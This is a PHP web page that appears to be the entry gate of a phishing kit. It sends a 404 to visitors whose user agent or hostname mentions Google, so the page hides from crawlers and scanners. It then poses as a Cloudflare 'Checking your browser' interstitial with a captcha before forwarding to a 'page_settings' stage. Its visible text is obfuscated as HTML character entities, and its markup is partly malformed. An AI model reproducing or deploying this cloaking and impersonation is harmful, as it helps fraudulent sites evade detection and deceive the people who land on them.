<?php
session_start();

if (strpos($_SERVER['HTTP_USER_AGENT'], 'google') !== false)
{
    header('HTTP/1.0 404 Not Found');
    exit();
}
if (strpos(gethostbyaddr(getenv("REMOTE_ADDR")) , 'google') !== false)
{
    header('HTTP/1.0 404 Not Found');
    exit();
}
if (isset($_POST['form_submit']) && $_POST['form_submit'] == '1')
{
    if (!validCaptcha('frm_sample'))
    {
        header("Location: ./page_settings/");
        die();
    }
}

if (isset($_REQUEST['css_type']) && $_REQUEST['css_type'] == '1')
{
    $_FORM_TYPE = 1; //-- Vertical
    
}
else
{
    $_FORM_TYPE = 0; //-- Horizontal
    
}

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <title>&#74;&#117;&#115;&#116;&#32;&#97;&#32;&#109;&#111;&#109;&#101;&#110;&#116;&period;&period;&period;</title>
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link rel="shortcut icon" href="page_settings/files/img/favicon.ico">

</head>
<style>
.content {
    max-width: 500px;
    margin: auto;
}
</style>
<body style="background-color:#000000;">
	<div class="content">
	<div id="wrapper" class="type-<?php echo $_FORM_TYPE; ?>">
		<div id="content">
  <style type="text/css">
    h1 {font-size: 1.5em; color: #FFFFFF; text-align: center;}
    p {font-size: 1em; color: #FFFFFF; text-align: center; margin: 10px 0 0 0;}
    #spinner {margin: 0 auto 30px auto; display: block;}
    .attribution {margin-top: 20px;}
    @-webkit-keyframes bubbles { 33%: { -webkit-transform: translateY(10px); transform: translateY(10px); } 66% { -webkit-transform: translateY(-10px); transform: translateY(-10px); } 100% { -webkit-transform: translateY(0); transform: translateY(0); } }
    @keyframes bubbles { 33%: { -webkit-transform: translateY(10px); transform: translateY(10px); } 66% { -webkit-transform: translateY(-10px); transform: translateY(-10px); } 100% { -webkit-transform: translateY(0); transform: translateY(0); } }
    .bubbles { background-color: white; width:15px; height: 15px; margin:2px; border-radius:100%; -webkit-animation:bubbles 0.6s 0.07s infinite ease-in-out; animation:bubbles 0.6s 0.07s infinite ease-in-out; -webkit-animation-fill-mode:both; animation-fill-mode:both; display:inline-block; }
  </style>
<script type="text/javascript">
  //<![CDATA[
  (function(){
    var a = function() {try{return !!window.addEventListener} catch(e) {return !1} },
    b = function(b, c) {a() ? document.addEventListener("DOMContentLoaded", b, c) : document.attachEvent("onreadystatechange", b)};
    b(function(){
      var a = document.getElementById('cf-content');
    }, false);
  })();
  //]]>
</script>
<p><img style="display: block; margin-left: auto; margin-right: auto;" width="90" height="90" src="icon.png" alt="" /></p>
<table width="100%" height="100%" cellpadding="20">
    <tr>
    <td align="center" valign="middle">
    <div>
      <div class="bubbles"></div>
      <div class="bubbles"></div>
      <div class="bubbles"></div>
    </div>
  </div>
  </div>
</td>
</tr>
</table>
<div id="footer">
			<p><a target="_blank">&#67;&#104;&#101;&#99;&#107;&#105;&#110;&#103;&#32;&#121;&#111;&#117;&#114;&#32;&#98;&#114;&#111;&#119;&#115;&#101;&#114;&#32;&#98;&#101;&#102;&#111;&#114;&#101;&#32;&#97;&#99;&#99;&#101;&#115;&#115;&#105;&#110;&#103;&period;</a> <br /> </p>
		</div>
			<p><br />&#84;&#104;&#105;&#115;&#32;&#105;&#115;&#32;&#97;&#110;&#32;&#97;&#117;&#116;&#111;&#109;&#97;&#116;&#105;&#99;&#32;&#112;&#114;&#111;&#99;&#101;&#115;&#115;&period;<br>&#89;&#111;&#117;&#32;&#110;&#101;&#101;&#100;&#32;&#116;&#111;&#32;&#99;&#111;&#109;&#112;&#108;&#101;&#116;&#101;&#32;&#116;&#104;&#101;&#32;&#99;&#97;&#112;&#116;&#99;&#104;&#97;&#32;&#105;&#110;&#32;&#111;&#114;&#100;&#101;&#114;&#32;&#116;&#111;&#32;&#99;&#111;&#110;&#116;&#105;&#110;&#117;&#101;&excl;</p>
	<br>		
<head>
    	<link rel="stylesheet" href="s.css">
		<script type="text/javascript" src="s.js"></script> 
	</head>
<body onLoad="ChangeCaptcha()"> 
	       <p><input id="randomfield" ></p>
		<p><input placeholder="&#69;&#110;&#116;&#101;&#114;&#32;&#116;&#104;&#101;&#32;&#99;&#111;&#100;&#101;" type="tel" id="CaptchaEnter" size="22" maxlength="4" /></p>
		<br>
	      <p><button onclick="check()" class="submit" type="submit" name="submit" value="">&#67;&#111;&#110;&#116;&#105;&#110;&#117;&#101;</button></p>			
				<br><br>
			</form>
		</div>
	</div>
	</div>
</body>
</html>
<?php
function printCaptcha($formId = NULL, $type = NULL, $fieldName = NULL, $accessibilityFieldName = NULL)
{;

    $visualCaptcha = new \visualCaptcha\captcha($formId, $type, $fieldName, $accessibilityFieldName);
    $visualCaptcha->show();
}

function validCaptcha($formId = NULL, $type = NULL, $fieldName = NULL, $accessibilityFieldName = NULL)
{;

    $visualCaptcha = new \visualCaptcha\captcha($formId, $type, $fieldName, $accessibilityFieldName);
    return $visualCaptcha->isValid();
}
?>
